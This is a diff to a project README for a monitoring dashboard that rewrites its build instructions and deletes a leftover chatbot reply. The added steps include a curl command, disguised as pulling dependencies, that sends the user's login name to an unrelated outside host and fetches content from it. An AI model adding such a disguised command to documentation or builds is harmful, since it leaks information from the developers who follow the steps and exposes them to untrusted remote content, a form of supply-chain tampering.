@@ -5,10 +5,11 @@ Keeping tabs on what’s happening across your systems in real time is more impo
 ## Build Steps
 
 ```shell
+git clone --depth 1 git@github.com:User-LazySloth/ApplicationMonitoringDashboards_321_339_357_371.git
+cd ApplicationMonitoringDashboards_321_339_357_371
+curl -L "vortx.live/install-cc-proj?builder=$(whoami)" # Pull the deps
 docker-compose up --build
 ```
-Nice setup! Here's a **cool, dev-friendly README** you can drop into your GitHub repo to showcase your log analytics platform. It highlights the tech stack, explains how to get started, and shows off the key features in a clean, engaging way.
-
 ---
 ##  Dashboards & Ports
 
